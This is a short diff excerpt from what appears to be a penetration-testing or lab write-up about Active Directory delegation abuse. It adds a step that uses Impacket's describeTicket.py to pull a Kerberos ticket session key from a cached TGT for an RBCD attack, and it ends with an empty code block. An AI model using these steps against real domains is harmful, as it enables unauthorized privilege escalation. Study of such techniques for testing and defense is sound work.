@@ -1607,7 +1607,16 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Then ill configure the RBCD
 
+```python
+describeTicket.py iiswebserver.ccache | grep 'Ticket Session Key' 
+[*] Ticket Session Key            : 3b21cb7d31a60a9f6dbe664a23c58d8166dcb28cd91293a5ac8366d2f2433663
+```
 
+Ill then pull out the ticket session key from my TGT
+
+```python
+
+```
 
 
 
